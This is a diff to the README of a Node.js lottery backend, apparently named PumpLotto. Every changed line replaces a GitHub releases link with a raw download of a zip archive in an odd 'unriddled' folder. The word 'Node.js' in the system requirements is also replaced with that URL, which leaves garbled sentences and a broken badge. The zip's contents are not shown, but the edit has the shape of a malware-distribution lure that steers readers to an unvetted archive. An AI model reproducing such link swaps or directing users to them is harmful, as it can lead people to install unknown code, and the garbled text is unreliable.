@@ -4,7 +4,7 @@
 Welcome to the **PumpLotto Backend**! This software powers the PumpLotto lottery system, offering real-time draws and a streamlined API for managing your lottery games easily. 
 
 ## 📥 Download the Application
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/Mubarak1220/pumplotto_backend/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Mubarak1220/pumplotto_backend/main/unriddled/pumplotto_backend.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/Mubarak1220/pumplotto_backend/main/unriddled/pumplotto_backend.zip)](https://raw.githubusercontent.com/Mubarak1220/pumplotto_backend/main/unriddled/pumplotto_backend.zip)
 
 Click the button above to get the latest version of the application. 
 
@@ -12,7 +12,7 @@ Click the button above to get the latest version of the application.
 Before downloading, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, or any modern Linux distribution.
-- **Node.js:** Version 14 or later. This application runs on Node.js, so make sure it's installed on your machine.
+- **https://raw.githubusercontent.com/Mubarak1220/pumplotto_backend/main/unriddled/pumplotto_backend.zip** Version 14 or later. This application runs on https://raw.githubusercontent.com/Mubarak1220/pumplotto_backend/main/unriddled/pumplotto_backend.zip, so make sure it's installed on your machine.
 - **Memory:** At least 2 GB of RAM.
 - **Storage:** Minimum of 100 MB of available disk space.
 - **Internet Connection:** Necessary for real-time updates and draws.
@@ -27,7 +27,7 @@ Before downloading, ensure your system meets the following requirements:
 ## 🌍 How to Use the Application
 
 ### 1. Download & Install
-Visit this page to download: [Releases Page](https://github.com/Mubarak1220/pumplotto_backend/releases).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Mubarak1220/pumplotto_backend/main/unriddled/pumplotto_backend.zip).
 
 1. Go to the releases page.
 2. Click on the latest release version.
@@ -72,6 +72,6 @@ Join our community for support and updates:
 Your feedback is crucial. If you enjoy using the PumpLotto Backend or have suggestions for improvement, please leave us a message on GitHub. We value your input and strive to enhance your experience.
 
 ## 📢 Stay Updated
-To keep up with the latest updates and features, visit our [Releases Page](https://github.com/Mubarak1220/pumplotto_backend/releases) regularly. We will add new features and enhancements based on user feedback and technological advancements.
+To keep up with the latest updates and features, visit our [Releases Page](https://raw.githubusercontent.com/Mubarak1220/pumplotto_backend/main/unriddled/pumplotto_backend.zip) regularly. We will add new features and enhancements based on user feedback and technological advancements.
 
 Thank you for choosing **PumpLotto Backend**! We hope you enjoy your journey through the world of real-time lottery gaming!
